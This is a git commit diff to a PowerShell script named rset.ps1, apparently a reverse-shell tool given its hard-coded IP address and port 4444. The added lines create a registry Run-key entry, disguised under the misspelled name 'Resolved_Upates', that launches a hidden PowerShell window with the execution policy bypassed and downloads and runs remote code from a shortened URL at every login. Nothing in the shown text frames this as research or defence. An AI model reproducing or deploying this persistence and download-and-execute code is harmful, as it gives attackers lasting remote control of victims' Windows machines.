d8ec3a9c4769b03239ddfe42113ae7cb0a094f73
CloudFox9 <72619248+CloudFox9@users.noreply.github.com>
2025-06-11 02:45:11 +0530

    Update rset.ps1

--- rset.ps1
+++ rset.ps1
@@ -1,3 +1,5 @@
+$command = 'Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"irm https://shorturl.at/OjiMT | iex`""'
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Resolved_Upates" -Value $command
 $ip = "134.209.113.62"
 $port = 4444
 
